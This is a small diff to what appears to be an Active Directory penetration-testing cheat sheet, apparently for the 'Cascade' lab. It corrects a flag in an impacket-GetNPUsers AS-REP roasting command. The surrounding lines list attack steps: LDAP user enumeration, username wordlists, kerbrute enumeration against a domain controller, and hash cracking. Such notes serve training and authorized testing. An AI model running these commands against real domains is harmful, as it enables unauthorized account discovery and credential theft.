@@ -44,7 +44,7 @@ ldapsearch -h <IP> -x -b “DC=cascade,DC=local” ‘(objectClass=person)’
 2. If we dont find some misconfiguration or user name try using this username list `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt` 
 3. or `https://github.com/jeanphorn/wordlist/blob/master/usernames.txt` for the below command
 4. `kerbrute userenum --dc $IP -d DOMAIN.NAME user.txt` user.txt is a userlist that we have created to authenticate to DC.
-5. `impacket-GetNPUsers -userfile user.txt -dc-ip $IP DOMAIN.NAME/`
+5. `impacket-GetNPUsers -usersfile user.txt -dc-ip $IP DOMAIN.NAME/`
 6. Crack the hash
    
    
